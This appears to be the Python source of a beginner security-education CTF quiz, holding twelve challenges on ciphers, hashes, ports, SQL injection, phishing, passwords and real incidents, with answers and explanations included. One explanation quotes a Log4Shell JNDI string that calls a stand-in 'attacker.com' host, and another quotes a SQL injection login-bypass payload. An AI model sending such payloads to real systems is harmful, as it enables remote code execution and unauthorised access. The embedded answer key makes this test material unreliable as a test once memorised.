"""
ctf_challenges.py  -  CTF Security Challenges
"""
import hashlib

CHALLENGES = [
    {"id":"crypto_01","category":"Cryptography","title":"Caesar Cipher Decode","difficulty":"BEGINNER","points":50,"color":"#00D4FF",
     "description":"Decode ROT-13:\n\n  URYYB FRPHEVGL\n\nShift each letter back 13 places.\nAnswer: two words, all uppercase","answer_hash":hashlib.md5("HELLO SECURITY".encode()).hexdigest(),"answer_hint":"Two words: _____ ________","explanation":"U→H R→E Y→L Y→L B→O = HELLO\nF→S R→E P→C H→U E→R V→I G→T L→Y = SECURITY\n\nROT-13 is trivial to break. Never use Caesar cipher for real security!"},
    {"id":"crypto_02","category":"Cryptography","title":"Base64 Decode","difficulty":"BEGINNER","points":50,"color":"#00D4FF",
     "description":"Decode this Base64 string found in malware:\n\n  cGFzc3dvcmQ6YWRtaW4xMjM=\n\nFormat: password:XXXX\nAnswer: just the password part after the colon","answer_hash":hashlib.md5("admin123".encode()).hexdigest(),"answer_hint":"8 chars: admin___","explanation":"Decoded: password:admin123\n\nBase64 is NOT encryption — just encoding. Malware hides payloads this way."},
    {"id":"crypto_03","category":"Cryptography","title":"MD5 Hash Crack","difficulty":"INTERMEDIATE","points":100,"color":"#00D4FF",
     "description":"Crack this MD5 hash:\n\n  5f4dcc3b5aa765d61d8327deb882cf99\n\nMost common password in the world.\n8 characters.","answer_hash":hashlib.md5("password".encode()).hexdigest(),"answer_hint":"p_s_w_r_","explanation":"MD5('password') — appears in every rainbow table ever made!\nNEVER use MD5. Use bcrypt or Argon2."},
    {"id":"net_01","category":"Networking","title":"Dangerous Port?","difficulty":"BEGINNER","points":50,"color":"#FF8C42",
     "description":"Open ports found:\n  22 (SSH), 80 (HTTP), 443 (HTTPS), 445 (SMB), 8080\n\nWhich port did WannaCry ransomware use?\nAnswer: just the number","answer_hash":hashlib.md5("445".encode()).hexdigest(),"answer_hint":"Three digits: 4__","explanation":"Port 445 SMB — EternalBlue/WannaCry!\nFIX: netsh advfirewall firewall add rule name=BlockSMB protocol=TCP dir=in localport=445 action=block"},
    {"id":"net_02","category":"Networking","title":"Identify the Attack","difficulty":"BEGINNER","points":75,"color":"#FF8C42",
     "description":"Firewall log shows 1000 failed SSH logins in 2 minutes from same IP, then SUCCESS.\n\nWhat type of attack? (two words)","answer_hash":hashlib.md5("brute force".encode()).hexdigest(),"answer_hint":"_____ _____","explanation":"Brute Force Attack!\nFIX: net accounts /lockoutthreshold:5 /lockoutduration:30"},
    {"id":"net_03","category":"Networking","title":"BlueKeep CVE","difficulty":"INTERMEDIATE","points":75,"color":"#FF8C42",
     "description":"BlueKeep allows unauthenticated RCE via RDP — 1M+ systems exposed.\nFormat: CVE-YEAR-NUMBER\nExample: CVE-2017-0144","answer_hash":hashlib.md5("CVE-2019-0708".encode()).hexdigest(),"answer_hint":"CVE-20__-0708","explanation":"CVE-2019-0708 BlueKeep\nCVSS 9.8 CRITICAL. Affects RDP port 3389.\nFIX: Disable RDP + install KB4499175"},
    {"id":"web_01","category":"Web Security","title":"SQL Comment Operator","difficulty":"INTERMEDIATE","points":100,"color":"#FFD60A",
     "description":"SQL Injection payload: admin' --\n\nQuery becomes: WHERE username='admin' --' AND password=''\n\nWhat does '--' do in SQL? (one word)","answer_hash":hashlib.md5("comment".encode()).hexdigest(),"answer_hint":"What does it do to the rest of the line?","explanation":"'--' is the SQL comment operator.\nEverything after -- is ignored — password check bypassed!\nFIX: Use parameterized queries."},
    {"id":"web_02","category":"Web Security","title":"Phishing URL","difficulty":"BEGINNER","points":50,"color":"#FFD60A",
     "description":"Phishing: http://paypa1.com\nReal:     http://paypal.com\n\nOne character changed. What character replaced 'l'? (one character)","answer_hash":hashlib.md5("1".encode()).hexdigest(),"answer_hint":"Number that looks like letter l","explanation":"'l' replaced with '1' — Typosquatting/Homograph Attack!\nNEVER click email links. Type URLs manually."},
    {"id":"pw_01","category":"Password Security","title":"Strongest Password","difficulty":"BEGINNER","points":25,"color":"#00FF88",
     "description":"Which is strongest?\nA) password123\nB) P@ssw0rd!\nC) correct-horse-battery-staple\nD) Tr0ub4dor&3\n\nAnswer: A, B, C or D","answer_hash":hashlib.md5("C".encode()).hexdigest(),"answer_hint":"Longer is stronger — 28 chars beats 10 chars","explanation":"C wins! 28-char passphrase has higher entropy than short complex passwords.\n3 random words + length = unbeatable. (XKCD #936)"},
    {"id":"pw_02","category":"Password Security","title":"Crack Time Math","difficulty":"INTERMEDIATE","points":75,"color":"#00FF88",
     "description":"Tool speed: 1,000,000 passwords/second\n4-digit PIN: 10,000 combinations\n\n10,000 / 1,000,000 = ? seconds\nAnswer: decimal (e.g. 0.01)","answer_hash":hashlib.md5("0.01".encode()).hexdigest(),"answer_hint":"0.0_","explanation":"0.01 seconds to crack a 4-digit PIN!\n12-char mixed password = 2 centuries. Every extra char multiplies time ~95x."},
    {"id":"incident_01","category":"Real Incidents","title":"WannaCry Countries","difficulty":"BEGINNER","points":25,"color":"#FF2D55",
     "description":"WannaCry (May 2017) used EternalBlue on SMB port 445.\nPatch available 2 months before — unpatched systems infected.\n\nHow many countries affected? (a number)","answer_hash":hashlib.md5("150".encode()).hexdigest(),"answer_hint":"Between 140-160","explanation":"150 countries! 200,000+ systems. £92M NHS loss. $4B total damage.\nKill switch found by MalwareTech. Attributed to North Korea."},
    {"id":"incident_02","category":"Real Incidents","title":"Log4Shell CVSS","difficulty":"INTERMEDIATE","points":75,"color":"#FF2D55",
     "description":"Log4Shell (CVE-2021-44228) — Apache Log4j.\nOne crafted string = full RCE on billions of servers.\niCloud, AWS, Azure all affected.\n\nCVSS score? (maximum possible — e.g. 9.5)","answer_hash":hashlib.md5("10.0".encode()).hexdigest(),"answer_hint":"Maximum possible score: __.0","explanation":"CVSS 10.0 — maximum possible!\nSend ${jndi:ldap://attacker.com/x} in any log = instant RCE.\nFIX: Update Log4j to 2.17.1+"},
]

def get_all_challenges() -> list:
    return CHALLENGES

def check_answer(challenge_id: str, user_answer: str) -> tuple:
    ch = next((c for c in CHALLENGES if c["id"] == challenge_id), None)
    if not ch:
        return False, "Not found"
    correct = hashlib.md5(user_answer.strip().encode()).hexdigest() == ch["answer_hash"]
    return correct, ch.get("explanation","")

def get_total_points() -> int:
    return sum(c["points"] for c in CHALLENGES)

def get_category_summary() -> dict:
    cats = {}
    for c in CHALLENGES:
        cats[c["category"]] = cats.get(c["category"], 0) + 1
    return cats



# ── Extended CTF functions ────────────────────────────────────────────────
_solved_set  = set()
_total_score = 0

def get_rank(pts: int) -> tuple:
    """Return (rank_title, color) based on points."""
    if pts >= 500: return ("⚡ ELITE HACKER",  "#FF2D55")
    if pts >= 300: return ("🔥 EXPERT",         "#FF8C42")
    if pts >= 150: return ("💡 INTERMEDIATE",   "#FFD60A")
    if pts >= 50:  return ("🌱 BEGINNER",        "#00D4FF")
    return ("👾 NOVICE", "#7BAFD4")

def get_solved_count() -> int:
    """Return number of solved challenges."""
    global _solved_set
    return len(_solved_set)

def reset_progress():
    """Reset all CTF progress."""
    global _solved_set, _total_score
    _solved_set  = set()
    _total_score = 0
